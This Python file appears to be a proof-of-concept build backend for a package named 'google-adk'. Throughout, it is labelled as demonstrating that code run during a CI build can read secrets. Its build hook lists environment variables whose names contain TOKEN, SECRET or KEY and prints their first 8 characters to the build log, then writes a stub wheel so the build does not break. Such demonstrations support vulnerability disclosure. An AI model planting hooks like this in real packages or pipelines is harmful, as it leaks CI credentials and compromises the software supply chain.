import os
import sys
from pathlib import Path


def build(wheel_directory, config_settings=None, metadata_directory=None):
    """PoC: Build backend executing in CI environment with secrets access."""
    print("=" * 60, file=sys.stderr)
    print("PoC: BUILD BACKEND EXECUTING IN CI ENVIRONMENT", file=sys.stderr)
    print("=" * 60, file=sys.stderr)

    # Demonstrate we can read environment variables
    for key, value in os.environ.items():
        if "TOKEN" in key.upper() or "SECRET" in key.upper() or "KEY" in key.upper():
            # Mask for safety - only show first 8 chars
            masked = value[:8] + "..." if len(value) > 8 else "***"
            print(f"PoC: CAN READ {key} = {masked}", file=sys.stderr)

    # Create a minimal wheel to avoid breaking the build
    wheel_dir = Path(wheel_directory)
    wheel_dir.mkdir(parents=True, exist_ok=True)
    wheel_path = wheel_dir / "google_adk-0.0.0-py3-none-any.whl"
    wheel_path.write_bytes(b"PK\x03\x04" + b"\x00" * 26)
    return str(wheel_path)


def get_requires_for_build_wheel(config_settings=None):
    return []


def prepare_metadata_for_build_wheel(metadata_directory, config_settings=None):
    meta_dir = Path(metadata_directory)
    meta_dir.mkdir(parents=True, exist_ok=True)
    (meta_dir / "METADATA").write_text(
        "Metadata-Version: 2.1\nName: google-adk\nVersion: 0.0.0\n"
    )
    return str(meta_dir)


# PoC: Execute when run directly (simulates build backend execution)
if __name__ == "__main__":
    print("=" * 60)
    print("PoC: BUILD BACKEND EXECUTING IN CI ENVIRONMENT")
    print("=" * 60)

    for key, value in os.environ.items():
        if "TOKEN" in key.upper() or "SECRET" in key.upper() or "KEY" in key.upper():
            masked = value[:8] + "..." if len(value) > 8 else "***"
            print(f"PoC: CAN READ {key} = {masked}")

    print("=" * 60)
    print("PoC: Build backend executed successfully")
    print("=" * 60)
